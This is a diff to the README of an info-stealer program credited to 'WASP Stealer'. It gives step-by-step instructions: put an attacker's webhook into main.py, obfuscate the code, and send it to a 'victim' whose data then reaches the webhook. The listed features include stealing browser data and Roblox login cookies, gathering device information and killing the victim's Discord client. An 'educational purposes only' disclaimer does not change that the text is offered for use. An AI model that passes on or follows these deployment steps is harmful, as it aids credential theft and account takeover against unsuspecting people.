@@ -22,11 +22,11 @@
 
 4. Open `main.py` with any text editor such as notepad.
 
-5. Replace `X` with your webhook where it says `hook = "X"`
+5. Replace `X` with your webhook where it says `hook = "X"` inside of the `main.py` file.
 
 6. Obfuscate your code: https://pyobfuscate.com/ (Recommended)
 
-7. Send `main.py` and `assets` (Required) to the victim and when they run `main.py` you will have their info in the webhook you provided in step 5.
+7. Send `main.py` to the victim and when they run `main.py` you will have their info in the webhook you provided in step 5.
 
 <a id="features"></a>
 
@@ -64,12 +64,12 @@
     - Browsers: Opera, Chrome, Brave, Yandex, Edge
 
 - Extras
-    - Kill victim's discord client
-    - Get information for the user's PC
+    - Gets information of the victim's device
+    - Sends roblox cookie (can be used to login their roblox account)
+ 
 
 ## Important
-
-Program may crash some times, but it still sends to your webhook. Open task manager and exit the program.
+ 
 I am not responsible for any damage this software may cause; This program was made for educational purposes only.
 
 Credits: WASP Stealer
